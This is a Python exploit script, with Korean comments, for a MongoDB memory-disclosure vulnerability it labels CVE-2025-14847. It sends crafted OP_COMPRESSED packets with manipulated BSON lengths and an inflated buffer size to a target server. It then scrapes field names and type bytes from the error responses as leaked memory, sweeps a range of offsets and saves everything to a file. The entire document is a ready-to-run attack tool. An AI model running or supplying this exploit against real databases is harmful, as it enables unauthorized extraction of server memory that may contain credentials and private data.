import socket
import struct
import zlib
import re
import argparse

# 조작된 OP COMPRESSED 페이로드 작성
def op_compressed_payload(doc_length, buffer_size):
    
    # BSON 문서 길이 조작 후 zlib 압축 적용
    content = b'\x10a\x00\x01\x00\x00\x00'
    bson = struct.pack('<i', doc_length) + content
    op_msg = struct.pack('<I', 0) + b'\x00' + bson
    compressed = zlib.compress(op_msg)
    
    # 조작된 BSON으로 OP COMPRESSED 페이로드 작성
    payload = struct.pack('<I', 2013)
    payload += struct.pack('<i', buffer_size)
    payload += struct.pack('B', 2)
    payload += compressed
    header = struct.pack('<IIII', 16 + len(payload), 1, 0, 2012)
    
    return header + payload

# DB 서버에 패킷 전송 및 수신
def exploit(host, port, doc_length, buffer_size):
    payload = op_compressed_payload(doc_length, buffer_size)
    
    try:
        # TCP 소캣 성성 및 전송
        sock = socket.socket()
        sock.settimeout(2)
        sock.connect((host, port))
        sock.sendall(payload)
        # 응답 수신
        response = b''
        
        while True:
            if(len(response) >= 4):
                msg_len = struct.unpack('<I', response[:4])[0]
                if len(response) >= msg_len:
                    break
            chunk = sock.recv(4096)
            
            if not chunk:
                break
            response += chunk
        sock.close()
        return response
    except Exception as e:
        return None

# 응답에서 누출된 데이터 수집
def leaked_data(response):
    if len(response) < 25:
        return []
    
    try:
        msg_len = struct.unpack('<I', response[:4])[0]
        
        if struct.unpack('<I', response[12:16])[0] == 2012:
            raw = zlib.decompress(response[25:msg_len])
        else:
            raw = response[16:msg_len]
    except:
        return []
    leaks = []
    
    for match in re.finditer(rb"field name '([^']*)'", raw):
        data = match.group(1)
        if data and data not in [b'?', b'a', b'$db', b'ping']:
            leaks.append(data)
            
    for match in re.finditer(rb"type (\d+)", raw):
        leaks.append(bytes([int(match.group(1)) & 0xFF]))
    return leaks

def main():
    parser = argparse.ArgumentParser(description='CVE-2025-14847')
    parser.add_argument('--host', default='localhost', help='Target host')
    parser.add_argument('--port', type=int, default=27017, help='Target port')
    parser.add_argument('--min-offset', type=int, default=20, help='Min doc length')
    parser.add_argument('--max-offset', type=int, default=8192, help='Max doc length')
    parser.add_argument('--output', default='leaked.bin', help='Output file')
    args = parser.parse_args()
    
    all_leaked = bytearray()
    unique_leaked = set()
    
    for doc_len in range(args.min_offset, args.max_offset):
        response = exploit(args.host, args.port, doc_len, doc_len + 500)
        leaks = leaked_data(response)
        
        for data in leaks:
            if data not in unique_leaked:
                unique_leaked.add(data)
                all_leaked.extend(data)
                
    with open(args.output, 'wb') as f:
        f.write(all_leaked)
        
    print()
    print(f"[*] Total leaked: {len(all_leaked)} bytes")
    print(f"[*] Unique fragments: {len(unique_leaked)}")
    print(f"[*] Saved to: {args.output}")

if __name__ == '__main__':
    main()